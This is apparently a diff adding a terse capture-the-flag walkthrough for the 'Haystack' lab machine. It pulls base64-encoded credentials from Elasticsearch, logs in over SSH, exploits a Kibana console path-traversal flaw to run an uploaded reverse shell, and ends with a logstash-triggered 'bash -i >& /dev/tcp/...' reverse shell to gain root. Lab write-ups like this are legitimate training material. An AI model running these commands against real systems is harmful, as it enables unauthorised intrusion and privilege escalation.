@@ -1,0 +1,37 @@
+first, find the ley in haystack:
+curl -X GET http://10.10.10.115:9200/quotes/quote/45 ->
+I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg
+
+curl -X GET http://10.10.10.115:9200/quotes/quote/111 ->
+Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=
+This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
+
+
+base64 -d u'll get :
+user: security
+pass: spanish.is.key
+
+next, ssh login to haystack
+
+now we are trying to priesc from security to kibana
+
+upload a rev shell with security and then executed it with the kibana url
+
+using :
+curl -i -X GET "http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/reverse_shell.js"
+
+( u have to upload reverse_shell.js first via security )
+( this is the CVE detail: https://www.anquanke.com/post/id/168291 )
+
+then, you'll see three interesting files after enum the linux
+/etc/logstash/conf.d
+-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+
+u should create logstash_* in /opt/kibana/
+the content of file based on those three files,
+:
+Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1
+
+then wait a sec, the root reverse_shell should pop out.
